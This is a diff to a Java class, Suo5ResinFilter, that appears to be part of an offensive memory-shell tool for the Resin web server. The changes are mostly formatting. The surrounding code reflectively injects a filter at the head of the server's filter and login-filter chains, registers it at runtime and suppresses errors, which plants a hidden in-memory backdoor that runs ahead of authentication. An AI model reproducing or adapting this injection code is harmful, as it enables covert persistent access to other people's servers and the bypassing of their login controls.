@@ -109,8 +109,6 @@ public class Suo5ResinFilter extends ClassLoader implements Filter, Runnable, Ho
 
         }
 
-
-
         return webapps.toArray();
     }
 
@@ -137,33 +135,30 @@ public class Suo5ResinFilter extends ClassLoader implements Filter, Runnable, Ho
                         Object _filterMapper = getFieldValue(webappContext,"_filterMapper");
                         List _filterMapper_filterMap = (List) getFieldValue(_filterMapper,"_filterMap");
                         _filterMapper_filterMap.add(0,filterConfigImpl);
-                    }catch (Exception e){}
+                    } catch (Exception e){
 
+                    }
 
                     try {
                         Object _loginFilterMapper = getFieldValue(webappContext,"_loginFilterMapper");
                         List _loginFilterMapper_filterMap = (List) getFieldValue(_loginFilterMapper,"_filterMap");
                         _loginFilterMapper_filterMap.add(0,filterConfigImpl);
-                    }catch (Exception e){
+                    } catch (Exception e){
 
                     }
 
                     webappContext.getClass().getMethod("addFilter",filterConfigImplClass).invoke(webappContext,filterConfigImpl);
 
                     webappContext.getClass().getMethod("clearCache").invoke(webappContext);
-                }catch (Throwable e) {
+                } catch (Throwable e) {
 
                 }
             }
         } catch (Throwable e) {
-
+            return e.getMessage();
         }
-
-
         return "ok";
     }
-
-
 
     public static Field getField(Object obj, String fieldName){
         Class clazz = null;
